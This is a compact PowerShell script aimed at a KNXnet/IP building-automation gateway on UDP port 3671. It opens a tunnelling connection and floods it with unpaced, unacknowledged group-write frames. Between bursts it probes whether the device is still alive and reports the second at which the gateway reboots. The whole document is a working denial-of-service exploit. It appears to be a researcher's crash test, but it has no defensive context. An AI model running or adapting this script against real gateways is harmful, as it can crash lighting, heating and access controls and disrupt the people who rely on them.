param([string]$Ip = "11.11.0.126", [int]$MaxSecs = 25)
function Kf([int]$s, [byte[]]$b) { $l = 6 + $b.Length; return [byte[]](@(0x06, 0x10, (($s -shr 8) -band 0xFF), ($s -band 0xFF), (($l -shr 8) -band 0xFF), ($l -band 0xFF)) + $b) }
function Hp([byte[]]$ip, [int]$p) { return [byte[]](@(0x08, 0x01) + $ip + @((($p -shr 8) -band 0xFF), ($p -band 0xFF))) }
function Li([string]$d) { $u = New-Object System.Net.Sockets.UdpClient; try { $u.Connect($d, 3671); return $u.Client.LocalEndPoint.Address.GetAddressBytes() } finally { $u.Close() } }
$me = Li $Ip; $ep = [System.Net.IPEndPoint]::new([System.Net.IPAddress]::Parse($Ip), 3671)
$any = { [System.Net.EndPoint]([System.Net.IPEndPoint]::new([System.Net.IPAddress]::Any, 0)) }
# DESCRIPTION_RESPONSE probe -> answers even when all tunnels are busy; only a REBOOT kills it.
function Alive() {
    $s = New-Object System.Net.Sockets.Socket("InterNetwork", "Dgram", "Udp"); $s.Bind([System.Net.IPEndPoint]::new([System.Net.IPAddress]::Any, 0))
    $mp = ([System.Net.IPEndPoint]$s.LocalEndPoint).Port; $h = Hp $me $mp
    $null = $s.SendTo((Kf 0x0203 $h), $ep); $s.ReceiveTimeout = 800; $b = New-Object byte[] 128; $f = & $any
    try { $rn = $s.ReceiveFrom($b, [ref]$f); $s.Close(); return ($rn -gt 8) } catch { $s.Close(); return $false }
}
# open a data tunnel
$s = New-Object System.Net.Sockets.Socket("InterNetwork", "Dgram", "Udp"); $s.Bind([System.Net.IPEndPoint]::new([System.Net.IPAddress]::Any, 0))
$mp = ([System.Net.IPEndPoint]$s.LocalEndPoint).Port; $h = Hp $me $mp
$null = $s.SendTo((Kf 0x0205 ([byte[]]($h + $h + @(0x04, 0x04, 0x02, 0x00)))), $ep); $s.ReceiveTimeout = 1500; $b = New-Object byte[] 64; $f = & $any
$rn = $s.ReceiveFrom($b, [ref]$f); if ($b[7] -ne 0) { Write-Host "connect failed"; exit }
$ch = $b[6]; Write-Host ("tunnel open ch=0x{0:X2}  alive-before={1}" -f $ch, (Alive))
$s.Blocking = $false
$seq = 0; $sent = 0; $disc = 0; $t0 = [datetime]::Now; $rebootAt = -1
$rb = New-Object byte[] 256
while (([datetime]::Now - $t0).TotalSeconds -lt $MaxSecs) {
    # jet a burst of incrementing-seq group writes, unpaced (never ACK the server)
    for ($k = 0; $k -lt 200; $k++) {
        $ga = (((($sent % 8) + 1) -shl 8) -bor ($sent % 200))
        $cemi = [byte[]](@(0x11, 0x00, 0xBC, 0xE0, 0x00, 0x00, (($ga -shr 8) -band 0xFF), ($ga -band 0xFF), 0x01, 0x00, 0x81))
        try { $null = $s.SendTo((Kf 0x0420 ([byte[]](@(0x04, [byte]$ch, [byte]($seq -band 0xFF), 0x00) + $cemi))), $ep) } catch {}
        $seq = ($seq + 1) -band 0xFF; $sent++
    }
    # look for a server-initiated DISCONNECT_REQUEST (0x0209) among inbound
    while ($s.Available -gt 0) { $f = & $any; try { $rn = $s.ReceiveFrom($rb, [ref]$f); if ($rn -ge 4 -and $rb[2] -eq 0x02 -and $rb[3] -eq 0x09) { $disc++ } } catch { break } }
    $el = ([datetime]::Now - $t0).TotalSeconds
    if (-not (Alive)) { $rebootAt = [math]::Round($el, 1); break }
}
$s.Close()
if ($rebootAt -ge 0) { Write-Host ("REBOOT detected at {0}s : sent={1:N0}  server-DISCONNECTs-seen={2}" -f $rebootAt, $sent, $disc) }
else { Write-Host ("no reboot in {0}s : sent={1:N0}  server-DISCONNECTs-seen={2}  alive={3}" -f $MaxSecs, $sent, $disc, (Alive)) }
